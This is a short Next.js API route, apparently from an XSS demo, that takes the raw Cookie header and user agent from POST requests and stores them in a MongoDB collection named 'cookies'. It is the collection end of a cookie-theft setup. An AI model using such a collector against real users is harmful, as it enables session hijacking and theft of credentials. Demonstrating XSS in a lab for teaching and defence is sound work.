import clientPromise from "../../../../lib/mongodb";
import { NextResponse } from "next/server";

export async function POST(req: Request) {
  try {
    // 👉 lấy cookie từ header
    const cookieHeader = req.headers.get("cookie");

    if (!cookieHeader) {
      return NextResponse.json(
        { error: "No cookie found" },
        { status: 400 }
      );
    }

    const client = await clientPromise;
    const db = client.db("xss-demo");

    const entry = {
      time: new Date(),
      name: "from-header",
      cookie: cookieHeader, // 👈 cookie raw
      userAgent: req.headers.get("user-agent"),
    };

    await db.collection("cookies").insertOne(entry);

    return NextResponse.json({ success: true });
  } catch (err) {
    console.error(err);

    return NextResponse.json(
      { error: "Failed to store cookie" },
      { status: 500 }
    );
  }
}